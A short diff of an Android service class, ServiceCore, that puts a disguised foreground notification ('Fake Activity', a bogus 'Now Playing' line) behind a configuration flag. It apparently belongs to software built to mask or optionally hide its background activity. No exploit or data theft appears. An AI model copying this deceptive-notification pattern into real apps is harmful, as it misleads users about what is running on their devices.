@@ -79,19 +79,20 @@ public class ServiceCore extends Service {
 
 		Status.setAppContext(getApplicationContext());
 
-		Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
-				System.currentTimeMillis());
-		
-		Intent i = new Intent(this, FakeActivity.class);
+		if (Cfg.ACTIVITY) {
+			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?", System.currentTimeMillis());
 
-		i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+			Intent i = new Intent(this, FakeActivity.class);
 
-		PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
+			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
 
-		note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
-		note.flags |= Notification.FLAG_NO_CLEAR;
+			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
 
-		startForeground(1337, note);
+			note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
+			note.flags |= Notification.FLAG_NO_CLEAR;
+
+			startForeground(1337, note);
+		}
 	}
 
 	@Override
@@ -210,7 +211,7 @@ public class ServiceCore extends Service {
 
 		core.Stop();
 		core = null;
-		
+
 		stopForeground(true);
 	}
 
